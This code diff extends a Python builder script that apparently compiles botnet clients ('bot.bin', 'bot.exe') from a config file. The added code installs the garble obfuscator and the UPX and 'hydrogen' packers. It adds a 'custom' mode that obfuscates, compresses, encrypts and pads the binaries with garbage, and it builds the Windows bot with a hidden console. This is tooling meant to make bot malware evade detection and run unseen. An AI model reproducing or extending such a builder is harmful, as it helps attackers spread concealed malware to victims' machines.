@@ -2,7 +2,49 @@ import json
 import os
 import sys
 import time
+import subprocess
 import socket
+
+
+def CheckDepend():
+    depend = subprocess.check_output("""
+    if ! command -v garble &>/dev/null || ! command -v upx &>/dev/null || ! command -v hydrogen &>/dev/null; then
+        echo true
+    fi
+
+    """, shell=True)
+
+    if depend.decode() != "":
+        syst = subprocess.check_output(
+            "cat /etc/os-release | grep ^ID=", shell=True)
+
+        ossys = syst.decode().removeprefix(
+            "ID=").removesuffix("\n")
+
+        if ossys == "ubuntu" or ossys == "debian":  # apt
+            subprocess.check_output("sudo apt update -y", shell=True)
+            subprocess.check_output("sudo apt install upx - y", shell=True)
+            subprocess.check_output(
+                "go install mvdan.cc/garble@latest", shell=True)
+            subprocess.check_output(
+                "go install github.com/LsdDance/hydrogen@latest", shell=True)
+
+        elif ossys == "manjaro" or ossys == "arch":  # pacman
+            subprocess.check_output("sudo pacman -S upx", shell=True)
+            subprocess.check_output(
+                "go install github.com/LsdDance/hydrogen@latest", shell=True)
+            subprocess.check_output(
+                "go install mvdan.cc/garble@latest", shell=True)
+
+        elif ossys == "fedora":  # dnf
+            subprocess.check_output("sudo dnf install upx", shell=True)
+            subprocess.check_output(
+                "go install github.com/LsdDance/hydrogen@latest", shell=True)
+            subprocess.check_output(
+                "go install mvdan.cc/garble@latest", shell=True)
+        else:
+            print("Unsupported OS")
+            exit(0)
 
 
 def ReadConfig(path: str) -> str:
@@ -15,7 +57,9 @@ def ReadConfig(path: str) -> str:
     return config
 
 
-def Build(config: str):
+def Build(config: str, compiler: str):
+
+    CheckDepend()
 
     with open("client/config/config.go") as botconf:
         conf = botconf.read()
@@ -46,12 +90,11 @@ def Build(config: str):
 	mkdir bin
 	mkdir bin/linux
 	mkdir bin/windows
-	
+    """)
 
-	GOOS=windows go build -ldflags "-s -w" -o win_server.exe .
-	GOOS=linux go build -ldflags "-s -w" -o linux_server.bin .
-	cp win_server.exe ./bin/windows
-	cp linux_server.bin ./bin/linux
+    if compiler == "default":
+
+        os.system("""
 
     cd client
 	GOOS=linux go build -ldflags "-s -w" -o bot.bin .
@@ -63,10 +106,29 @@ def Build(config: str):
 	rm bot.bin
 	rm bot.exe
 
-	rm ../linux_server.bin
-	rm ../win_server.exe
 
     """)
+
+    else:
+        os.system("""
+        
+        cd client
+		GOOS=linux garble -seed=random -literals -tiny build -trimpath -o bot.bin .
+        hydrogen -compress -encrypt -garbage -output bot.bin
+
+        GOOS=windows go build -ldflags "-H windowsgui -s -w" -o bot.exe .
+        hydrogen -encrypt -garbage -output bot.exe
+
+
+        cp bot.bin ../bin/linux
+	    cp bot.exe ../bin/windows
+
+    	rm bot.bin
+	    rm bot.exe
+
+
+
+        """)
 
 
 if __name__ == "__main__":
@@ -75,8 +137,21 @@ if __name__ == "__main__":
         print("I can't work on your OS")
         exit(0)
 
+    try:
+        compiler = sys.argv[1]
+    except:
+        print(
+            "python3 builder.py [COMPILER (default/custom) ]\nExample:\npython3 builder.py custom")
+        exit(0)
+
+    if compiler != "custom" and compiler != "default":
+        print(
+            "python3 builder.py [COMPILER (default/custom) ]\nExample:\npython3 builder.py custom")
+        exit(0)
+
     config = ReadConfig("./config.json")  # U can change config dir
 
     print("Building...")
-    Build(config)
-    print("Success. Build dir: bin")
+
+    Build(config, compiler)
+    print("\nSuccess. Build dir: bin")
